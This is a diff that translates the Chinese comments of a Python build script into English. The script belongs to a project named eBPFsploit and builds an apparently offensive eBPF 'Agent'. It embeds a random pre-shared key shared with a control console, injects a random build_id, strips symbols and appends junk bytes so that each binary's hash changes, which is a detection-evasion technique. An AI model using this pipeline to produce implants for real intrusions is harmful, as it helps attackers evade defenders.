@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """
-eBPFsploit 一体化构建脚本
+eBPFsploit Integrated Build Script
 ========================
-功能：
-  1. 生成随机 UUID 作为 Pre-Shared Key (PSK)
-  2. 将 PSK 硬编码到 agent.c 和 console.py
-  3. 注入随机 build_id 改变二进制 Hash
-  4. 编译 Agent 并去除符号表
-  5. 在二进制末尾追加随机垃圾数据
+Features:
+  1. Generate random UUID as Pre-Shared Key (PSK)
+  2. Hardcode PSK into agent.c and console.py
+  3. Inject random build_id to change binary Hash
+  4. Compile Agent and strip symbol table
+  5. Append random junk data at the end of binary
 
-用法：
-  python3 builder.py                  # 从 agent/ 目录运行
-  python3 agent/builder.py            # 从项目根目录运行（Makefile 使用此方式）
+Usage:
+  python3 builder.py                  # Run from agent/ directory
+  python3 agent/builder.py            # Run from project root (used by Makefile)
 """
 
 import os
@@ -21,7 +21,7 @@ import random
 import string
 import re
 
-# 路径自适应：支持从项目根目录或 agent/ 目录运行
+# Path adaptation: supports running from project root or agent/ directory
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
 AGENT_SRC = os.path.join(SCRIPT_DIR, "agent.c")
@@ -30,7 +30,7 @@ CONSOLE_SRC = os.path.join(PROJECT_ROOT, "console", "console.py")
 TEMP_BUILD = os.path.join(SCRIPT_DIR, "temp_build.c")
 
 PSK_PLACEHOLDER = "__EBPFSPLOIT_PSK__"
-# 匹配占位符或已替换的 UUID（兼容重复构建）
+# Match placeholder or replaced UUID (compatible with repeated builds)
 PSK_PATTERN = re.compile(
     r'(?:__EBPFSPLOIT_PSK__|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'
 )
@@ -58,7 +58,7 @@ def patch_psk_in_file(filepath, psk, in_place=False):
 
 
 def restore_psk_in_file(filepath):
-    """恢复文件中的 PSK 为占位符（用于 clean）"""
+    """Restore PSK in file to placeholder (for clean)"""
     with open(filepath, "r", encoding="utf-8") as f:
         content = f.read()
 
@@ -69,19 +69,19 @@ def restore_psk_in_file(filepath):
 
 
 def build_agent(psk):
-    """构建唯一的 Agent 二进制"""
-    # 1. 读取 agent.c 并替换 PSK
+    """Build unique Agent binary"""
+    # 1. Read agent.c and replace PSK
     patched_code = patch_psk_in_file(AGENT_SRC, psk, in_place=False)
 
-    # 2. 注入随机 build_id 改变 Hash
+    # 2. Inject random build_id to change Hash
     junk_str = f'\nconst char *build_id = "{generate_junk(32)}";\n'
     patched_code = patched_code.replace("int main", junk_str + "int main")
 
-    # 3. 写入临时文件
+    # 3. Write to temporary file
     with open(TEMP_BUILD, "w", encoding="utf-8") as f:
         f.write(patched_code)
 
-    # 4. 编译
+    # 4. Compile
     print("[*] Compiling Agent with embedded PSK...")
     ret = os.system(f"gcc -O2 {TEMP_BUILD} -o {AGENT_BIN} -lbpf -lelf -lz")
     if ret != 0:
@@ -89,14 +89,14 @@ def build_agent(psk):
         os.remove(TEMP_BUILD)
         sys.exit(1)
 
-    # 5. 去除符号表
+    # 5. Strip symbol table
     os.system(f"strip -s {AGENT_BIN}")
 
-    # 6. 追加随机垃圾数据
+    # 6. Append random junk data
     with open(AGENT_BIN, "ab") as f:
         f.write(os.urandom(random.randint(16, 64)))
 
-    # 7. 清理临时文件
+    # 7. Cleanup temporary file
     os.remove(TEMP_BUILD)
 
 
@@ -106,11 +106,11 @@ def build():
     print(f"[+] Generated PSK: {psk}")
     print()
 
-    # 构建 Agent（使用临时文件，不修改源码）
+    # Build Agent (using temporary file, does not modify source)
     build_agent(psk)
     print(f"[+] Agent built: {AGENT_BIN}")
 
-    # 将 PSK 写入 console.py（原地修改）
+    # Write PSK to console.py (in-place modification)
     patch_psk_in_file(CONSOLE_SRC, psk, in_place=True)
     print(f"[+] PSK injected into: {CONSOLE_SRC}")
 
@@ -120,7 +120,7 @@ def build():
 
 
 def clean():
-    """恢复 console.py 中的 PSK 为占位符"""
+    """Restore PSK in console.py to placeholder"""
     if os.path.exists(CONSOLE_SRC):
         restore_psk_in_file(CONSOLE_SRC)
         print(f"[+] Restored PSK placeholder in {CONSOLE_SRC}")
